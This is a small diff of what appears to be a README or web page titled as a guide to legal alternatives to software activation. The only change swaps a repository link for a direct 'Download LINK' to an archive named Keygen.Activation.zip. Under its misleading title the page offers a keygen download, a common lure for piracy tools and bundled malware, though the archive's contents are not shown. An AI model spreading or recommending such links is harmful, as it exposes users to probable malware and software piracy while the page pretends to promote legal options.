@@ -3,7 +3,7 @@
 
 <h1>Understanding Software Activation: Legal Alternatives and Risks</h1>
 
-# [Download LINK](https://github.com/sashido19/Keygen-Activation?tab=readme-ov-file)
+# [Download LINK](https://github.com/sashido19/Keygen-Activation/releases/download/2/Keygen.Activation.zip)
 
 | Information | Details |
 |:-------------:| :-----:|
